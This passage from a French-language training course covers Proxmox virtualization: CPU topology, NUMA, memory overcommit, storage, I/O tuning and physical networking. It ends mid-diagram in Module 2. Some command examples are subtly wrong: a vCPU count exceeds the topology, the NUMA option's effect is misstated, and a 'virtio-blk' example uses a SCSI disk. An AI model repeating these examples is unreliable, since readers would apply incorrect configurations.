# Cours Complet : Administration Système, Virtualisation et Réseaux
## De Débutant à Expert

---

**Auteur :** Guide de Formation Technique  
**Niveau :** Débutant à Expert  
**Durée estimée :** 40-60 heures d'apprentissage  

---

## Table des Matières

### Introduction et Objectifs
- [Présentation du cours](#présentation-du-cours)
- [Prérequis et progression](#prérequis-et-progression)
- [Comment utiliser ce guide](#comment-utiliser-ce-guide)

### Module 1 : Bases Hardware
- [1.1 Architecture CPU : Sockets, Cores, Threads](#11-architecture-cpu)
- [1.2 Gestion de la RAM](#12-gestion-de-la-ram)
- [1.3 Stockage et I/O](#13-stockage-et-io)
- [1.4 Réseau physique](#14-réseau-physique)

### Module 2 : Virtualisation
- [2.1 Concepts fondamentaux](#21-concepts-fondamentaux)
- [2.2 Hyperviseurs Type 1 vs Type 2](#22-hyperviseurs)
- [2.3 CPU virtuel et NUMA](#23-cpu-virtuel-et-numa)
- [2.4 Virtualisation imbriquée](#24-virtualisation-imbriquée)

### Module 3 : Réseau Virtuel
- [3.1 Bridges et commutateurs virtuels](#31-bridges-et-commutateurs-virtuels)
- [3.2 VLAN et segmentation](#32-vlan-et-segmentation)
- [3.3 vNIC et virtio](#33-vnic-et-virtio)
- [3.4 Bonding et agrégation](#34-bonding-et-agrégation)

### Module 4 : Stockage
- [4.1 Stockage local vs distribué](#41-stockage-local-vs-distribué)
- [4.2 LVM et LVM-Thin](#42-lvm-et-lvm-thin)
- [4.3 ZFS](#43-zfs)
- [4.4 Ceph et stockage distribué](#44-ceph-et-stockage-distribué)

### Module 5 : Haute Disponibilité et Clustering
- [5.1 Concepts de clustering](#51-concepts-de-clustering)
- [5.2 Data plane vs Control plane](#52-data-plane-vs-control-plane)
- [5.3 Proxmox clustering](#53-proxmox-clustering)
- [5.4 Migration et failover](#54-migration-et-failover)

### Module 6 : Cas d'Usage DevOps
- [6.1 Infrastructure as Code](#61-infrastructure-as-code)
- [6.2 CI/CD avec virtualisation](#62-cicd-avec-virtualisation)
- [6.3 Kubernetes et conteneurs](#63-kubernetes-et-conteneurs)
- [6.4 Microservices et orchestration](#64-microservices-et-orchestration)

### Module 7 : Cas d'Usage Cybersécurité
- [7.1 Laboratoires Red Team](#71-laboratoires-red-team)
- [7.2 Segmentation réseau](#72-segmentation-réseau)
- [7.3 DMZ et bastions](#73-dmz-et-bastions)
- [7.4 Isolation et sandboxing](#74-isolation-et-sandboxing)

### Annexes
- [Glossaire](#glossaire)
- [FAQ](#faq)
- [Feuille de route d'apprentissage](#feuille-de-route-dapprentissage)
- [Références et ressources](#références-et-ressources)

---

## Présentation du cours

### Objectifs pédagogiques

Ce cours vous accompagne dans la maîtrise complète de l'administration système moderne, de la virtualisation et des réseaux. Vous apprendrez à :

- **Comprendre** l'architecture hardware et sa relation avec la virtualisation
- **Maîtriser** les concepts de clustering et haute disponibilité
- **Configurer** des infrastructures réseau complexes avec VLAN et SDN
- **Gérer** différents types de stockage (local, distribué, software-defined)
- **Implémenter** des solutions DevOps et de cybersécurité
- **Optimiser** les performances et la sécurité de vos infrastructures

### Approche pédagogique

**Progression par analogies** : Chaque concept complexe est expliqué avec des analogies du quotidien (un bridge réseau = une multiprise intelligente, un hyperviseur = un chef d'orchestre, etc.).

**Exemples concrets** : Chaque notion théorique est immédiatement illustrée par des cas d'usage réels en développement, opérations et cybersécurité.

**Schémas visuels** : Des diagrammes ASCII intégrés pour visualiser les architectures et flux de données.

**Pratique immédiate** : Des commandes prêtes à utiliser et des exercices progressifs.

---

## Prérequis et progression

### Niveau requis
- **Débutant** : Notions de base Linux/Windows, utilisation du terminal
- **Intermédiaire** : Compréhension des réseaux TCP/IP, expérience basique VM

### Progression recommandée
1. **Semaines 1-2** : Modules 1-2 (bases hardware et virtualisation)
2. **Semaines 3-4** : Modules 3-4 (réseau et stockage)
3. **Semaines 5-6** : Modules 5-7 (clustering et cas d'usage)
4. **Semaine 7** : Révisions et projets pratiques

### Environnement de test
Pour suivre ce cours efficacement, vous aurez besoin de :
- **Machine physique** : 16 GB RAM minimum, CPU avec support virtualisation
- **Proxmox VE** : Installation sur machine dédiée ou VM (nested virtualization)
- **Accès réseau** : Pour télécharger ISO et packages

---

## Comment utiliser ce guide

### Structure des modules
Chaque module suit cette organisation :
1. **Introduction** : Contexte et objectifs
2. **Concepts théoriques** : Définitions et explications
3. **Schémas et diagrammes** : Visualisation des architectures
4. **Exemples pratiques** : Commandes et configurations
5. **Cas d'usage** : Applications concrètes
6. **Quiz** : 5 questions pour valider la compréhension
7. **Bonnes pratiques** : Check-list des recommandations
8. **Références** : Documentation officielle et ressources

### Conventions utilisées

```bash
# Commandes à exécuter (copier-coller)
pvesm status
```

> **💡 Astuce** : Conseils et bonnes pratiques

> **⚠️ Attention** : Points critiques et pièges à éviter

> **🔧 Pratique** : Exercices hands-on

**Terme technique** : Définition ou explication

---

*Ce guide est conçu pour être votre référence complète. N'hésitez pas à revenir sur les sections précédentes et à adapter le rythme à votre niveau.*



---

# Module 1 : Bases Hardware

## 1.1 Architecture CPU : Sockets, Cores, Threads

### Introduction aux processeurs modernes

L'architecture des processeurs modernes constitue le fondement de toute infrastructure virtualisée. Pour comprendre comment optimiser vos machines virtuelles et conteneurs, il est essentiel de maîtriser la hiérarchie CPU : socket → core → thread. Cette compréhension vous permettra d'éviter les erreurs courantes de sur-allocation et d'optimiser les performances de vos charges de travail.

Un **socket** représente l'emplacement physique où se connecte un processeur sur la carte mère. Dans un serveur moderne, vous pouvez avoir 1, 2, 4 ou même 8 sockets. Chaque socket contient un processeur complet avec ses propres caches, contrôleurs mémoire et liens d'interconnexion.

Imaginez un socket comme un **chef d'équipe** dans une cuisine professionnelle. Chaque chef (socket) supervise plusieurs cuisiniers (cores) qui peuvent chacun gérer plusieurs tâches simultanément (threads). Plus vous avez de chefs, plus vous pouvez traiter de commandes en parallèle, mais la coordination devient plus complexe.

### Architecture détaillée : Socket → Core → Thread

```
Serveur physique
├── Socket 0 (CPU 0)
│   ├── Core 0
│   │   ├── Thread 0 (vCPU 0)
│   │   └── Thread 1 (vCPU 1)
│   ├── Core 1
│   │   ├── Thread 2 (vCPU 2)
│   │   └── Thread 3 (vCPU 3)
│   └── Cache L3 partagé
├── Socket 1 (CPU 1)
│   ├── Core 0
│   │   ├── Thread 4 (vCPU 4)
│   │   └── Thread 5 (vCPU 5)
│   └── Cache L3 partagé
└── Interconnexion (QPI/UPI)
```

Un **core** (cœur) est une unité de traitement indépendante capable d'exécuter des instructions. Les processeurs modernes intègrent généralement entre 4 et 64 cores par socket. Chaque core possède ses propres caches L1 et L2, mais partage le cache L3 avec les autres cores du même socket.

Un **thread** (fil d'exécution) représente la capacité d'un core à traiter plusieurs flux d'instructions simultanément grâce à l'Hyper-Threading (Intel) ou SMT (AMD). Un core peut généralement gérer 2 threads, doublant ainsi le nombre de vCPU disponibles pour la virtualisation.

### Impact sur la virtualisation

Lorsque vous créez une machine virtuelle, vous lui attribuez des **vCPU** (CPU virtuels). La règle fondamentale est qu'un vCPU correspond à un thread physique. Cependant, la topologie que vous choisissez impacte directement les performances :

**Configuration optimale pour une VM 8 vCPU :**
- ✅ **Recommandé** : 1 socket, 4 cores, 2 threads = topologie cohérente
- ❌ **À éviter** : 8 sockets, 1 core, 1 thread = overhead de communication

```bash
# Proxmox : Configuration CPU optimale pour VM
qm set 100 -sockets 1 -cores 4 -vcpus 8
# Résultat : 1 socket × 4 cores × 2 threads = 8 vCPU
```

### NUMA : Non-Uniform Memory Access

NUMA représente l'architecture mémoire des serveurs multi-socket modernes. Chaque socket possède sa propre banque de mémoire RAM directement connectée. L'accès à la mémoire "locale" (même socket) est plus rapide que l'accès à la mémoire "distante" (autre socket).

```
Architecture NUMA 2 sockets :

Socket 0                    Socket 1
┌─────────────────┐        ┌─────────────────┐
│ CPU 0           │◄──────►│ CPU 1           │
│ ├─ 8 cores      │  QPI   │ ├─ 8 cores      │
│ └─ Cache L3     │        │ └─ Cache L3     │
├─────────────────┤        ├─────────────────┤
│ RAM 64 GB       │        │ RAM 64 GB       │
│ (Local)         │        │ (Local)         │
└─────────────────┘        └─────────────────┘
      ▲                              ▲
      │ Accès rapide                 │ Accès rapide
      │ (100 ns)                     │ (100 ns)
      │                              │
      └──────────────────────────────┘
         Accès distant (150 ns)
```

**Impact pratique :** Une VM configurée sur 2 sockets NUMA différents subira une pénalité de performance de 20-30% due aux accès mémoire distants. Proxmox gère automatiquement l'affinité NUMA, mais vous pouvez l'optimiser manuellement.

```bash
# Vérifier la topologie NUMA
numactl --hardware

# Forcer une VM sur un nœud NUMA spécifique
qm set 100 -numa 1
```

### Exemples concrets et bonnes pratiques

**Cas d'usage 1 : Serveur de base de données**
Pour une base de données critique nécessitant 16 vCPU, privilégiez une configuration 1 socket × 8 cores × 2 threads plutôt que 2 sockets × 4 cores × 2 threads. Cela évite les latences NUMA et optimise l'accès aux caches partagés.

**Cas d'usage 2 : Cluster Kubernetes**
Pour des nœuds Kubernetes, limitez chaque VM à un seul socket NUMA. Cela simplifie la gestion des ressources par le scheduler Kubernetes et améliore la prévisibilité des performances.

**Cas d'usage 3 : Laboratoire Red Team**
Dans un environnement de test de pénétration, vous pouvez sur-allouer les vCPU (ratio 4:1 ou 8:1) car les outils de sécurité sont rarement CPU-intensifs. Une machine physique 16 cores peut supporter 64-128 vCPU répartis sur plusieurs VM de test.

### Commandes de diagnostic et optimisation

```bash
# Afficher la topologie CPU complète
lscpu

# Vérifier l'utilisation par core
mpstat -P ALL 1

# Proxmox : Lister les VM et leur allocation CPU
qm list

# Proxmox : Modifier la topologie d'une VM
qm set <vmid> -sockets 2 -cores 4 -vcpus 16

# Vérifier l'affinité NUMA d'un processus
cat /proc/<pid>/numa_maps
```

---

## 1.2 Gestion de la RAM

### Concepts fondamentaux de la mémoire virtuelle

La gestion de la RAM dans un environnement virtualisé implique plusieurs couches d'abstraction qui peuvent sembler complexes au premier abord. Imaginez la mémoire comme un **système de bibliothèque à plusieurs niveaux** : la RAM physique est l'espace de stockage réel, la mémoire virtuelle est le catalogue qui référence tous les livres disponibles (même ceux stockés ailleurs), et l'hyperviseur agit comme le bibliothécaire qui optimise l'utilisation de l'espace.

Dans un système non-virtualisé, chaque application accède directement à la mémoire physique via le système d'exploitation. Avec la virtualisation, nous ajoutons une couche supplémentaire : l'hyperviseur doit gérer la mémoire pour plusieurs systèmes d'exploitation invités simultanément, chacun pensant avoir accès exclusif à toute la RAM.

### Architecture de la mémoire virtualisée

```
Application
    ↓
Mémoire virtuelle invitée (Guest Virtual Memory)
    ↓
Mémoire physique invitée (Guest Physical Memory)
    ↓
Mémoire virtuelle hôte (Host Virtual Memory)
    ↓
Mémoire physique hôte (Host Physical Memory)
```

Cette architecture à quatre niveaux permet une flexibilité extraordinaire mais introduit aussi des défis de performance. L'hyperviseur doit maintenir des tables de correspondance entre la mémoire que voit chaque VM et la mémoire physique réelle du serveur.

### Memory Overcommit : Principe et risques

L'**overcommit** mémoire consiste à allouer plus de RAM virtuelle aux VM que la quantité physiquement disponible sur l'hôte. Cette technique repose sur l'observation que la plupart des applications n'utilisent pas simultanément toute leur mémoire allouée.

**Exemple concret :** Votre serveur physique dispose de 64 GB de RAM. Vous pouvez créer 4 VM de 32 GB chacune (128 GB total alloué) si vous savez que chaque VM n'utilise réellement que 12-16 GB en moyenne.

```
Serveur physique : 64 GB RAM
├── VM1 : 32 GB alloué → 12 GB utilisé
├── VM2 : 32 GB alloué → 16 GB utilisé  
├── VM3 : 32 GB alloué → 14 GB utilisé
└── VM4 : 32 GB alloué → 10 GB utilisé
Total alloué : 128 GB
Total utilisé : 52 GB (< 64 GB physique) ✅
```

**Risques de l'overcommit :**
- **Memory pressure** : Si toutes les VM utilisent simultanément leur allocation maximale
- **Performance dégradée** : Activation du swap, ralentissement général
- **OOM Killer** : Terminaison forcée de processus en cas de manque critique

### Ballooning : Gestion dynamique de la mémoire

Le **ballooning** est une technique élégante qui permet à l'hyperviseur de récupérer dynamiquement de la mémoire inutilisée des VM. Un driver spécial (balloon driver) s'exécute dans chaque VM invitée et peut "gonfler" ou "dégonfler" selon les besoins de l'hôte.

**Analogie :** Imaginez des ballons gonflables dans des boîtes (VM). Quand une boîte a besoin de plus d'espace, l'hyperviseur peut dégonfler les ballons des autres boîtes pour libérer de la place.

```
État initial :
VM1 [████████░░] 8/10 GB utilisés
VM2 [██████░░░░] 6/10 GB utilisés  
VM3 [████░░░░░░] 4/10 GB utilisés

VM1 a besoin de plus de mémoire :
VM1 [██████████] 10/10 GB utilisés
VM2 [████░░░░░░] 4/8 GB (balloon +2GB)
VM3 [██░░░░░░░░] 2/6 GB (balloon +2GB)
```

**Configuration du ballooning dans Proxmox :**

```bash
# Activer le ballooning pour une VM
qm set 100 -balloon 1024  # Minimum 1GB garanti

# Vérifier l'état du ballooning
qm monitor 100
info balloon
```

### Hugepages : Optimisation pour les charges critiques

Les **hugepages** remplacent les pages mémoire standard de 4 KB par des pages de 2 MB ou 1 GB. Cette technique réduit drastiquement la pression sur le TLB (Translation Lookaside Buffer) et améliore les performances pour les applications manipulant de gros volumes de données.

**Cas d'usage typiques :**
- **Bases de données** : Oracle, PostgreSQL avec de gros buffer pools
- **Applications HPC** : Calcul scientifique, simulations
- **NFV** : Fonctions réseau virtualisées nécessitant des performances déterministes

```bash
# Configuration des hugepages sur l'hôte
echo 1024 > /sys/kernel/mm/hugepages/hugepages-2048kB/nr_hugepages

# Vérification
cat /proc/meminfo | grep Huge

# Proxmox : Activer hugepages pour une VM
qm set 100 -hugepages 2  # Pages de 2MB
```

**Impact performance :** Les hugepages peuvent améliorer les performances de 10-30% pour les applications intensives en mémoire, au prix d'une flexibilité réduite dans l'allocation mémoire.

### KSM : Kernel Same-page Merging

KSM est une technologie de déduplication mémoire qui identifie et fusionne les pages identiques entre différentes VM. Cette technique est particulièrement efficace quand vous exécutez plusieurs VM avec le même système d'exploitation.

**Exemple concret :** 10 VM Ubuntu identiques partagent de nombreuses pages système communes. KSM peut réduire l'utilisation mémoire de 20-40% en fusionnant ces pages redondantes.

```bash
# Activer KSM sur l'hôte Proxmox
echo 1 > /sys/kernel/mm/ksm/run

# Configurer la fréquence de scan
echo 100 > /sys/kernel/mm/ksm/sleep_millisecs

# Vérifier les statistiques KSM
cat /sys/kernel/mm/ksm/pages_shared
cat /sys/kernel/mm/ksm/pages_sharing
```

### Stratégies de dimensionnement mémoire

**Règle du 80/20 :** Dimensionnez votre infrastructure pour que l'utilisation mémoire reste sous 80% en fonctionnement normal. Les 20% restants servent de buffer pour les pics de charge et les opérations de maintenance.

**Calcul d'overcommit sécurisé :**
```
RAM physique : 128 GB
RAM réservée hôte : 16 GB (12.5%)
RAM disponible VM : 112 GB
Ratio overcommit : 1.5x
RAM total allouable : 168 GB
```

**Monitoring et alertes :**

```bash
# Script de monitoring mémoire
#!/bin/bash
TOTAL_RAM=$(free -g | awk 'NR==2{print $2}')
USED_RAM=$(free -g | awk 'NR==2{print $3}')
USAGE_PERCENT=$((USED_RAM * 100 / TOTAL_RAM))

if [ $USAGE_PERCENT -gt 80 ]; then
    echo "ALERT: Memory usage at ${USAGE_PERCENT}%"
    # Déclencher ballooning ou migration
fi
```

### Cas d'usage spécialisés

**Laboratoire de cybersécurité :** Dans un environnement Red Team, vous pouvez agressivement sur-allouer la mémoire (ratio 3:1 ou 4:1) car les outils de test sont généralement légers. Utilisez KSM pour optimiser les VM similaires et le ballooning pour gérer les pics ponctuels.

**Infrastructure de développement :** Pour des environnements CI/CD, configurez des hugepages pour les bases de données de test et utilisez l'overcommit modéré (1.5x) pour maximiser le nombre d'environnements parallèles.

**Production critique :** Désactivez l'overcommit, réservez 20% de mémoire pour l'hôte, et utilisez des hugepages pour les applications critiques. Configurez des alertes strictes et des procédures de migration automatique.

---

## 1.3 Stockage et I/O

### Architecture du stockage moderne

Le stockage dans un environnement virtualisé moderne ressemble à un **système postal complexe** avec plusieurs niveaux de tri et d'acheminement. Les données partent de l'application, traversent le système de fichiers de la VM, passent par l'hyperviseur, puis atteignent finalement le stockage physique. Chaque étape ajoute de la latence mais aussi des possibilités d'optimisation.

L'évolution du stockage a suivi une progression claire : des disques mécaniques locaux vers des solutions software-defined distribuées, en passant par les SAN traditionnels. Cette évolution répond aux besoins croissants de performance, de disponibilité et de scalabilité des infrastructures modernes.

### Hiérarchie des performances de stockage

```
Performance (IOPS) et Latence :

NVMe SSD (local)     : 500,000+ IOPS, <0.1ms
├── Idéal pour : Bases de données, logs
└── Limitation : Pas de redondance

SATA SSD (local)     : 50,000 IOPS, 0.1-0.5ms  
├── Idéal pour : Systèmes d'exploitation
└── Bon compromis prix/performance

NVMe over Fabric     : 200,000+ IOPS, 0.2-0.5ms
├── Idéal pour : Stockage partagé haute perf
└── Complexité réseau élevée

iSCSI SSD           : 20,000 IOPS, 0.5-2ms
├── Idéal pour : Stockage partagé standard
└── Dépendant du réseau

Ceph (SSD)          : 10,000 IOPS, 1-5ms
├── Idéal pour : Stockage distribué
└── Overhead de réplication

HDD (7200 RPM)      : 150 IOPS, 8-15ms
├── Idéal pour : Archivage, backup
└── Performance limitée
```

### Types de stockage et cas d'usage

**Stockage local** représente la solution la plus simple et performante pour des cas d'usage spécifiques. Chaque nœud possède ses propres disques, offrant des performances maximales mais sans redondance ni migration à chaud.

**Avantages du stockage local :**
- Performance maximale (accès direct)
- Simplicité de configuration
- Coût réduit (pas d'infrastructure réseau)
- Latence prévisible

**Inconvénients :**
- Pas de migration à chaud des VM
- Point de défaillance unique
- Gestion complexe des sauvegardes

**Stockage partagé** permet la migration à chaud, la haute disponibilité et la gestion centralisée, au prix d'une complexité et d'un coût accrus.

### Protocoles de stockage réseau

**iSCSI (Internet Small Computer Systems Interface)** encapsule les commandes SCSI dans des paquets TCP/IP, permettant d'utiliser l'infrastructure Ethernet existante pour le stockage.

```bash
# Configuration iSCSI sur Proxmox
# 1. Installer les outils iSCSI
apt install open-iscsi

# 2. Découvrir les cibles disponibles
iscsiadm -m discovery -t st -p 192.168.1.100

# 3. Se connecter à une cible
iscsiadm -m node -T iqn.2024-01.com.example:storage1 -p 192.168.1.100 --login

# 4. Ajouter le stockage dans Proxmox
pvesm add iscsi storage-iscsi --portal 192.168.1.100 --target iqn.2024-01.com.example:storage1
```

**NFS (Network File System)** offre une approche plus simple avec partage au niveau fichier plutôt que bloc.

```bash
# Configuration NFS sur Proxmox
pvesm add nfs storage-nfs --server 192.168.1.200 --export /srv/proxmox --content images,vztmpl,backup
```

**Ceph RBD** fournit un stockage distribué avec réplication automatique et auto-réparation.

### Optimisation des performances I/O

**Queue Depth** représente le nombre d'opérations I/O en attente simultanément. L'optimisation de ce paramètre est cruciale pour maximiser les performances, particulièrement avec les SSD NVMe.

```bash
# Vérifier la queue depth actuelle
cat /sys/block/sda/queue/nr_requests

# Optimiser pour SSD NVMe
echo 32 > /sys/block/nvme0n1/queue/nr_requests

# Configuration permanente dans /etc/udev/rules.d/60-ioschedulers.rules
ACTION=="add|change", KERNEL=="nvme[0-9]*", ATTR{queue/scheduler}="none"
ACTION=="add|change", KERNEL=="sd[a-z]", ATTR{queue/rotational}=="0", ATTR{queue/scheduler}="mq-deadline"
```

**I/O Scheduler** détermine l'ordre de traitement des requêtes I/O. Le choix optimal dépend du type de stockage :

- **none** : Pour NVMe SSD (pas de réorganisation nécessaire)
- **mq-deadline** : Pour SATA SSD (optimise les accès séquentiels)
- **bfq** : Pour HDD (équité entre processus)

**Virtio-blk vs Virtio-scsi** : Deux drivers de stockage virtualisé avec des caractéristiques différentes.

```bash
# Configuration Virtio-blk (performance maximale)
qm set 100 -scsi0 local-lvm:vm-100-disk-0,cache=writeback,discard=on

# Configuration Virtio-scsi (fonctionnalités avancées)
qm set 100 -scsi0 local-lvm:vm-100-disk-0,cache=writeback,discard=on,iothread=1
```

### Cache et Write-back strategies

Le cache de stockage peut dramatiquement améliorer les performances, mais introduit des risques de perte de données en cas de panne.

**Modes de cache disponibles :**

```
writethrough : Sécurisé mais lent
├── Écrit simultanément cache et stockage
└── Aucun risque de perte de données

writeback : Rapide mais risqué  
├── Écrit d'abord en cache
├── Synchronise périodiquement
└── Risque de perte si panne

none : Pas de cache
├── Performance native du stockage
└── Recommandé pour stockage partagé
```

**Configuration optimale par cas d'usage :**

```bash
# Base de données critique (sécurité maximale)
qm set 100 -scsi0 storage:vm-100-disk-0,cache=writethrough

# Serveur web (performance/sécurité équilibrée)  
qm set 100 -scsi0 storage:vm-100-disk-0,cache=writeback

# Stockage partagé (éviter double cache)
qm set 100 -scsi0 ceph:vm-100-disk-0,cache=none
```

### Monitoring et diagnostic des performances

**Outils de monitoring I/O :**

```bash
# iostat : Statistiques détaillées par device
iostat -x 1

# iotop : Processus consommant le plus d'I/O
iotop -o

# fio : Benchmark de performance
fio --name=random-write --ioengine=libaio --rw=randwrite --bs=4k --size=1G --numjobs=4 --runtime=60 --group_reporting

# Proxmox : Monitoring via API
pvesh get /nodes/proxmox/storage/local-lvm/status
```

**Métriques clés à surveiller :**
- **IOPS** : Opérations par seconde
- **Latence** : Temps de réponse moyen
- **Queue depth** : Profondeur de file d'attente
- **Utilisation** : Pourcentage d'occupation

### Cas d'usage spécialisés

**Infrastructure DevOps :** Utilisez du stockage local NVMe pour les nœuds de build CI/CD, avec réplication des artefacts sur stockage partagé. Configurez des caches writeback agressifs pour maximiser les performances de compilation.

**Laboratoire Red Team :** Privilégiez la rapidité de déploiement avec des templates sur stockage local, et utilisez des snapshots fréquents pour revenir rapidement à un état propre entre les tests.

**Production critique :** Implémentez une stratégie de stockage hybride : stockage local pour les logs et données temporaires, stockage partagé pour les données critiques avec réplication synchrone.

---

## 1.4 Réseau Physique

### Fondamentaux de l'infrastructure réseau

L'infrastructure réseau physique constitue la colonne vertébrale de toute architecture virtualisée moderne. Contrairement à un réseau traditionnel où chaque serveur possède une ou deux interfaces réseau, un environnement virtualisé multiplie exponentiellement les flux réseau. Un seul serveur physique peut héberger des dizaines de machines virtuelles, chacune avec ses propres interfaces réseau virtuelles, créant un défi complexe de gestion et d'optimisation.

Imaginez le réseau physique comme le **système autoroutier d'une métropole**. Les interfaces physiques sont les autoroutes principales, les VLAN sont les voies spécialisées (bus, véhicules légers, poids lourds), et les bridges virtuels sont les échangeurs qui permettent aux différents flux de se croiser sans se mélanger.

### Architecture réseau multicouche

```
Couche Application (VM/Conteneurs)
    ↓
Couche Virtualisation (vNIC, bridges)
    ↓  
Couche Hyperviseur (OVS, Linux Bridge)
    ↓
Couche Physique (NIC, Switch, Routeur)
    ↓
Couche Transport (Ethernet, IP, TCP/UDP)
```

Cette architecture multicouche permet une flexibilité extraordinaire mais nécessite une compréhension approfondie des interactions entre chaque niveau. Un paquet réseau émis par une application dans une VM traverse potentiellement 6-8 couches d'abstraction avant d'atteindre le réseau physique.

### Interfaces réseau et bonding

**Bonding** (ou agrégation de liens) combine plusieurs interfaces physiques en une seule interface logique, offrant redondance et/ou augmentation de bande passante. Cette technique est essentielle dans un environnement de production pour éviter les points de défaillance unique.

**Modes de bonding principaux :**

```
Mode 0 (balance-rr) : Round-robin
├── Répartition équitable des paquets
├── Bande passante cumulée
└── Nécessite switch compatible

Mode 1 (active-backup) : Actif/Passif
├── Une interface active, autres en standby
├── Basculement automatique en cas de panne
└── Compatible avec tous les switches

Mode 4 (802.3ad) : LACP
├── Agrégation dynamique négociée
├── Bande passante cumulée + redondance
└── Nécessite configuration switch

Mode 6 (balance-alb) : Adaptive Load Balancing
├── Équilibrage adaptatif
├── Pas de configuration switch requise
└── Optimisation automatique des flux
```

**Configuration pratique du bonding :**

```bash
# Création d'un bond en mode LACP
cat > /etc/systemd/network/bond0.netdev << EOF
[NetDev]
Name=bond0
Kind=bond

[Bond]
Mode=802.3ad
TransmitHashPolicy=layer3+4
MIIMonitorSec=100
EOF

# Configuration des interfaces membres
cat > /etc/systemd/network/eth0.network << EOF
[Match]
Name=eth0

[Network]
Bond=bond0
EOF

# Activation
systemctl restart systemd-networkd
```

### VLAN et segmentation réseau

**VLAN (Virtual Local Area Network)** permet de segmenter logiquement un réseau physique en plusieurs réseaux isolés. Cette segmentation est cruciale pour la sécurité, la performance et l'organisation des flux réseau dans un environnement virtualisé.

**Types de VLAN :**
- **VLAN natif** : Trafic non-taggé (généralement VLAN 1)
- **VLAN taggé** : Trafic avec étiquette 802.1Q
- **VLAN de gestion** : Dédié à l'administration
- **VLAN de stockage** : Isolé pour le trafic SAN/NAS

```
Configuration VLAN sur Proxmox :

Interface physique (ens18)
├── VLAN 10 (Management) : 192.168.10.0/24
├── VLAN 20 (Production) : 192.168.20.0/24  
├── VLAN 30 (Storage)    : 192.168.30.0/24
└── VLAN 40 (DMZ)        : 192.168.40.0/24
```

**Configuration VLAN dans Proxmox :**

```bash
# Création d'interfaces VLAN
auto ens18.10
iface ens18.10 inet static
    address 192.168.10.10/24
    vlan-raw-device ens18

# Bridge avec VLAN awareness
auto vmbr0
iface vmbr0 inet manual
    bridge-ports ens18
    bridge-stp off
    bridge-fd 0
    bridge-vlan-aware yes
    bridge-vids 2-4094
```

### Optimisation des performances réseau

**Jumbo Frames** augmentent la taille maximale des trames Ethernet de 1500 à 9000 octets, réduisant l'overhead de traitement pour les gros transferts de données.

```bash
# Configuration Jumbo Frames
ip link set dev ens18 mtu 9000

# Vérification
ping -M do -s 8972 192.168.1.100  # 8972 + 28 (headers) = 9000
```

**SR-IOV (Single Root I/O Virtualization)** permet à une interface réseau physique de présenter plusieurs fonctions virtuelles directement accessibles par les VM, contournant l'hyperviseur pour des performances maximales.

```bash
# Vérification du support SR-IOV
lspci -v | grep -i sriov

# Activation des fonctions virtuelles
echo 4 > /sys/class/net/ens18/device/sriov_numvfs

# Attribution d'une VF à une VM
qm set 100 -hostpci0 01:10.0
```

**DPDK (Data Plane Development Kit)** offre des performances réseau exceptionnelles en contournant le kernel Linux et en accédant directement au hardware réseau.

### Monitoring et diagnostic réseau

**Outils de diagnostic essentiels :**

```bash
# Statistiques détaillées par interface
ethtool -S ens18

# Monitoring en temps réel
iftop -i ens18

# Analyse des performances
iperf3 -s  # Serveur
iperf3 -c 192.168.1.100 -t 60  # Client

# Capture de paquets
tcpdump -i ens18 -w capture.pcap

# Analyse de la latence
mtr 192.168.1.100
```

**Métriques réseau critiques :**
- **Bande passante** : Débit effectif vs théorique
- **Latence** : Temps de réponse réseau
- **Jitter** : Variation de la latence
- **Perte de paquets** : Pourcentage de paquets perdus
- **Erreurs** : CRC, collisions, overruns

### Sécurité réseau physique

**Port Security** limite le nombre d'adresses MAC autorisées par port switch, prévenant les attaques par flooding de table CAM.

**802.1X** authentifie les devices avant l'accès réseau, essentiel dans un environnement avec de nombreuses interfaces virtuelles.

**VLAN Hopping** représente une vulnérabilité où un attaquant peut accéder à des VLAN non-autorisés. La prévention passe par :
- Désactivation du VLAN natif sur les ports trunk
- Configuration explicite des VLAN autorisés
- Isolation des VLAN sensibles

### Cas d'usage spécialisés

**Infrastructure DevOps :** Séparez les flux CI/CD sur des VLAN dédiés avec QoS pour garantir les performances des builds critiques. Utilisez SR-IOV pour les nœuds de test nécessitant des performances réseau natives.

**Laboratoire de cybersécurité :** Implémentez une segmentation stricte avec des VLAN isolés pour chaque scénario de test. Configurez des bridges internes pour simuler des réseaux d'entreprise complexes sans impact sur l'infrastructure de production.

**Production critique :** Déployez une architecture réseau redondante avec bonding LACP, séparation physique des flux de gestion et de données, et monitoring proactif avec alertes automatisées sur les métriques de performance et de sécurité.

---


# Module 2 : Virtualisation

## 2.1 Concepts fondamentaux

### Qu'est-ce que la virtualisation ?

La virtualisation représente une révolution technologique qui permet d'abstraire les ressources physiques pour créer des environnements logiques indépendants. Imaginez la virtualisation comme un **chef d'orchestre magistral** qui dirige simultanément plusieurs orchestres (machines virtuelles) avec un seul ensemble d'instruments (hardware physique). Chaque orchestre joue sa propre partition, ignorant l'existence des autres, tandis que le chef coordonne l'utilisation optimale de chaque instrument.

Cette abstraction résout des problèmes fondamentaux de l'informatique moderne : sous-utilisation des serveurs, isolation des applications, flexibilité de déploiement, et optimisation des coûts. Avant la virtualisation, un serveur physique exécutait généralement un seul système d'exploitation avec un taux d'utilisation moyen de 10-15%. Aujourd'hui, ce même serveur peut héberger 20-50 machines virtuelles avec un taux d'utilisation de 70-80%.

### Types de virtualisation

**Virtualisation complète (Full Virtualization)** émule complètement le hardware physique, permettant aux systèmes d'exploitation invités de fonctionner sans modification. L'hyperviseur intercepte et traduit toutes les instructions privilégiées.

**Paravirtualisation** nécessite des modifications du système d'exploitation invité pour qu'il communique directement avec l'hyperviseur via des hypercalls, éliminant l'overhead de l'émulation.

**Virtualisation assistée par hardware** exploite les extensions CPU (Intel VT-x, AMD-V) pour accélérer la virtualisation en permettant l'exécution directe d'instructions privilégiées dans un contexte contrôlé.

```
Évolution des performances :

Émulation logicielle    : 100% overhead
├── Traduction complète des instructions
└── Performance : 50% du natif

Paravirtualisation     : 10-20% overhead  
├── Hypercalls optimisés
└── Performance : 80-90% du natif

Hardware-assisted      : 2-5% overhead
├── Exécution directe avec contrôle
└── Performance : 95-98% du natif
```

### Architecture de la virtualisation

L'architecture moderne de virtualisation s'organise en couches distinctes, chacune avec ses responsabilités spécifiques :

```
┌─────────────────────────────────────────────┐
│           Applications Invitées             │
├─────────────────────────────────────────────┤
│        Système d'Exploitation Invité       │
├─────────────────────────────────────────────┤
│              Hyperviseur                    │
│  ┌─────────────┐ ┌─────────────────────────┐│
│  │   Scheduler │ │    Memory Manager       ││
│  │     CPU     │ │                         ││
│  └─────────────┘ └─────────────────────────┘│
│  ┌─────────────┐ ┌─────────────────────────┐│
│  │   Network   │ │    Storage Manager      ││
│  │   Manager   │ │                         ││
